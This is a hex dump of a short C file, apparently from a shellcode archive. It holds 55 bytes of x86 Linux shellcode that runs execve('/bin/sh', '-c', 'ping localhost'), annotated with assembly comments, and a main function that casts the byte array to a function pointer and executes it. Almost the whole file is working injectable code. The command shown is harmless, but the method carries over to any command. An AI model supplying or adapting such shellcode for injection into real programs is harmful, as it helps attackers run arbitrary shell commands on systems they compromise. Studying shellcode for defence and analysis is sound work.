00000000  2f 2a 0d 0a 4e 61 6d 65  20 20 20 3a 20 35 35 20  |/*..Name   : 55 |
00000010  62 79 74 65 73 20 73 79  73 5f 65 78 65 63 76 65  |bytes sys_execve|
00000020  28 22 2f 62 69 6e 2f 73  68 22 2c 20 22 2d 63 22  |("/bin/sh", "-c"|
00000030  2c 20 22 70 69 6e 67 20  6c 6f 63 61 6c 68 6f 73  |, "ping localhos|
00000040  74 22 29 20 78 38 36 20  6c 69 6e 75 78 20 73 68  |t") x86 linux sh|
00000050  65 6c 6c 63 6f 64 65 0d  0a 44 61 74 65 20 20 20  |ellcode..Date   |
00000060  3a 20 6d 61 79 2c 20 33  31 20 32 30 31 30 0d 0a  |: may, 31 2010..|
00000070  41 75 74 68 6f 72 20 3a  20 67 75 6e 73 6c 69 6e  |Author : gunslin|
00000080  67 65 72 5f 0d 0a 57 65  62 20 20 20 20 3a 20 64  |ger_..Web    : d|
00000090  65 76 69 6c 7a 63 30 64  65 2e 63 6f 6d 0d 0a 62  |evilzc0de.com..b|
000000a0  6c 6f 67 20 20 20 3a 20  67 75 6e 73 6c 69 6e 67  |log   : gunsling|
000000b0  65 72 2e 64 65 76 69 6c  7a 63 30 64 65 2e 63 6f  |er.devilzc0de.co|
000000c0  6d 0d 0a 74 65 73 74 65  64 20 6f 6e 20 3a 20 6c  |m..tested on : l|
000000d0  69 6e 75 78 20 64 65 62  69 61 6e 0d 0a 2a 2f 0d  |inux debian..*/.|
000000e0  0a 0d 0a 63 68 61 72 20  61 73 73 68 6f 6c 65 5b  |...char asshole[|
000000f0  5d 20 3d 20 22 5c 78 36  61 5c 78 30 62 22 20 20  |] = "\x6a\x0b"  |
00000100  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 70 75  |           // pu|
00000110  73 68 20 20 20 24 30 78  62 0d 0a 09 09 22 5c 78  |sh   $0xb...."\x|
00000120  35 38 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |58"             |
00000130  20 20 20 20 20 2f 2f 20  70 6f 70 20 20 20 20 25  |     // pop    %|
00000140  65 61 78 0d 0a 09 09 22  5c 78 39 39 22 20 20 20  |eax...."\x99"   |
00000150  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
00000160  2f 20 63 6c 74 64 0d 0a  09 09 22 5c 78 35 32 22  |/ cltd...."\x52"|
00000170  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000180  20 20 2f 2f 20 70 75 73  68 20 20 20 25 65 64 78  |  // push   %edx|
00000190  0d 0a 09 09 22 5c 78 36  38 5c 78 37 33 5c 78 37  |...."\x68\x73\x7|
000001a0  34 5c 78 32 30 5c 78 32  30 22 20 20 2f 2f 20 70  |4\x20\x20"  // p|
000001b0  75 73 68 20 20 20 24 30  78 32 30 32 30 37 34 37  |ush   $0x2020747|
000001c0  33 0d 0a 09 09 22 5c 78  36 38 5c 78 36 31 5c 78  |3...."\x68\x61\x|
000001d0  36 63 5c 78 36 38 5c 78  36 66 22 20 20 2f 2f 20  |6c\x68\x6f"  // |
000001e0  70 75 73 68 20 20 20 24  30 78 36 66 36 38 36 63  |push   $0x6f686c|
000001f0  36 31 0d 0a 09 09 22 5c  78 36 38 5c 78 32 30 5c  |61...."\x68\x20\|
00000200  78 36 63 5c 78 36 66 5c  78 36 33 22 20 20 2f 2f  |x6c\x6f\x63"  //|
00000210  20 70 75 73 68 20 20 20  24 30 78 36 33 36 66 36  | push   $0x636f6|
00000220  63 32 30 0d 0a 09 09 22  5c 78 36 38 5c 78 37 30  |c20...."\x68\x70|
00000230  5c 78 36 39 5c 78 36 65  5c 78 36 37 22 20 20 2f  |\x69\x6e\x67"  /|
00000240  2f 20 70 75 73 68 20 20  20 24 30 78 36 37 36 65  |/ push   $0x676e|
00000250  36 39 37 30 0d 0a 09 09  22 5c 78 38 39 5c 78 65  |6970...."\x89\xe|
00000260  36 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |6"              |
00000270  2f 2f 20 6d 6f 76 20 20  20 20 25 65 73 70 2c 25  |// mov    %esp,%|
00000280  65 73 69 0d 0a 09 09 22  5c 78 35 32 22 20 20 20  |esi...."\x52"   |
00000290  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
000002a0  2f 20 70 75 73 68 20 20  20 25 65 64 78 0d 0a 09  |/ push   %edx...|
000002b0  09 22 5c 78 36 36 5c 78  36 38 5c 78 32 64 5c 78  |."\x66\x68\x2d\x|
000002c0  36 33 22 20 20 20 20 20  20 2f 2f 20 70 75 73 68  |63"      // push|
000002d0  77 20 20 24 30 78 36 33  32 64 0d 0a 09 09 22 5c  |w  $0x632d...."\|
000002e0  78 38 39 5c 78 65 31 22  20 20 20 20 20 20 20 20  |x89\xe1"        |
000002f0  20 20 20 20 20 20 2f 2f  20 6d 6f 76 20 20 20 20  |      // mov    |
00000300  25 65 73 70 2c 25 65 63  78 0d 0a 09 09 22 5c 78  |%esp,%ecx...."\x|
00000310  35 32 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |52"             |
00000320  20 20 20 20 20 2f 2f 20  70 75 73 68 20 20 20 25  |     // push   %|
00000330  65 64 78 0d 0a 09 09 22  5c 78 36 38 5c 78 32 66  |edx...."\x68\x2f|
00000340  5c 78 32 66 5c 78 37 33  5c 78 36 38 22 20 20 2f  |\x2f\x73\x68"  /|
00000350  2f 20 70 75 73 68 20 20  20 24 30 78 36 38 37 33  |/ push   $0x6873|
00000360  32 66 32 66 0d 0a 09 09  22 5c 78 36 38 5c 78 32  |2f2f...."\x68\x2|
00000370  66 5c 78 36 32 5c 78 36  39 5c 78 36 65 22 20 20  |f\x62\x69\x6e"  |
00000380  2f 2f 20 70 75 73 68 20  20 20 24 30 78 36 65 36  |// push   $0x6e6|
00000390  39 36 32 32 66 0d 0a 09  09 22 5c 78 38 39 5c 78  |9622f...."\x89\x|
000003a0  65 33 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |e3"             |
000003b0  20 2f 2f 20 6d 6f 76 20  20 20 20 25 65 73 70 2c  | // mov    %esp,|
000003c0  25 65 62 78 0d 0a 09 09  22 5c 78 35 32 22 20 20  |%ebx...."\x52"  |
000003d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000003e0  2f 2f 20 70 75 73 68 20  20 20 25 65 64 78 0d 0a  |// push   %edx..|
000003f0  09 09 22 5c 78 35 36 22  20 20 20 20 20 20 20 20  |.."\x56"        |
00000400  20 20 20 20 20 20 20 20  20 20 2f 2f 20 70 75 73  |          // pus|
00000410  68 20 20 20 25 65 73 69  0d 0a 09 09 22 5c 78 35  |h   %esi...."\x5|
00000420  31 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |1"              |
00000430  20 20 20 20 2f 2f 20 70  75 73 68 20 20 20 25 65  |    // push   %e|
00000440  63 78 0d 0a 09 09 22 5c  78 35 33 22 20 20 20 20  |cx...."\x53"    |
00000450  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000460  20 70 75 73 68 20 20 20  25 65 62 78 0d 0a 09 09  | push   %ebx....|
00000470  22 5c 78 38 39 5c 78 65  31 22 20 20 20 20 20 20  |"\x89\xe1"      |
00000480  20 20 20 20 20 20 20 20  2f 2f 20 6d 6f 76 20 20  |        // mov  |
00000490  20 20 25 65 73 70 2c 25  65 63 78 0d 0a 09 09 22  |  %esp,%ecx...."|
000004a0  5c 78 63 64 5c 78 38 30  22 3b 20 20 20 20 20 20  |\xcd\x80";      |
000004b0  20 20 20 20 20 20 20 2f  2f 20 69 6e 74 20 20 20  |       // int   |
000004c0  20 24 30 78 38 30 0d 0a  09 09 0d 0a 69 6e 74 20  | $0x80......int |
000004d0  6d 61 69 6e 28 69 6e 74  20 61 72 67 63 2c 20 63  |main(int argc, c|
000004e0  68 61 72 20 2a 2a 61 72  67 76 29 0d 0a 7b 0d 0a  |har **argv)..{..|
000004f0  20 20 69 6e 74 20 28 2a  66 75 6e 63 29 28 29 3b  |  int (*func)();|
00000500  0d 0a 20 20 66 75 6e 63  20 3d 20 28 69 6e 74 20  |..  func = (int |
00000510  28 2a 29 28 29 29 20 61  73 73 68 6f 6c 65 3b 0d  |(*)()) asshole;.|
00000520  0a 20 20 28 69 6e 74 29  28 2a 66 75 6e 63 29 28  |.  (int)(*func)(|
00000530  29 3b 0d 0a 7d                                    |);..}|
00000535
